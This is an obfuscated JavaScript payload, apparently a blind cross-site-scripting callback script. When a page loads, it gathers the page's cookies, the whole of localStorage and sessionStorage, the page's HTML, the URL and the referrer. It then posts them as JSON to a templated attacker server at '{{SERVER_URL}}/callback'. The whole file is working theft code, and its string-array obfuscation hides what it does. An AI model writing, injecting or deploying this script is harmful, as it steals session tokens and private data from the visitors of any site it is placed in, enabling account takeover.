var _$_x=['{{SERVER_URL}}','/callback','POST','Content-Type','application/json','no-cors','omit','open','send','setRequestHeader','cookie','split','trim','slice','join','key','getItem','length','documentElement','outerHTML','substring','href','referrer','title','origin','toISOString','DOMContentLoaded','stringify','XMLHttpRequest'];
(function(a,b){var c=function(d){while(--d){a['push'](a['shift']())}};c(++b)}(_$_x,0x61));
(function(){
'use strict';
var S=_$_x[0x0];
function q(f){try{return f()}catch(e){return null}}
function A(){var o={};q(function(){for(var i=0;i<localStorage[_$_x[0x11]];i++){var k=localStorage[_$_x[0xf]](i);o[k]=localStorage[_$_x[0x10]](k)}});return o}
function B(){var o={};q(function(){for(var i=0;i<sessionStorage[_$_x[0x11]];i++){var k=sessionStorage[_$_x[0xf]](i);o[k]=sessionStorage[_$_x[0x10]](k)}});return o}
function C(){return q(function(){var o={};if(!document[_$_x[0xa]])return o;document[_$_x[0xa]][_$_x[0xb]](';').forEach(function(p){var t=p[_$_x[0xc]]()[_$_x[0xb]]('=');var k=decodeURIComponent(t[0x0]);var v=decodeURIComponent(t[_$_x[0xd]](0x1)[_$_x[0xe]]('='));o[k]=v});return o})||{}}
function D(){return q(function(){return document[_$_x[0x12]][_$_x[0x13]][_$_x[0x14]](0x0,0x7530)})}
function E(d){
var p=JSON[_$_x[0x1b]](d);
if(typeof fetch!=='undefined'){q(function(){fetch(S+_$_x[0x1],{method:_$_x[0x2],headers:{[_$_x[0x3]]:_$_x[0x4]},body:p,keepalive:!0x0,mode:_$_x[0x5],credentials:_$_x[0x6]})});return}
q(function(){var x=new window[_$_x[0x1c]]();x[_$_x[0x7]](S+_$_x[0x1],_$_x[0x2],!0x0);x[_$_x[0x9]](_$_x[0x3],_$_x[0x4]);x[_$_x[0x8]](p)})}
function F(){var d={url:q(function(){return window.location[_$_x[0x15]]||document.URL}),referer:q(function(){return document[_$_x[0x16]]}),title:q(function(){return document[_$_x[0x17]]}),cookies:C(),localStorage:A(),sessionStorage:B(),dom:D(),origin:q(function(){return window[_$_x[0x18]]}),timestamp:new Date()[_$_x[0x19]]()};E(d)}
if(document.readyState==='loading'){document.addEventListener(_$_x[0x1a],F)}else{F()}
})();
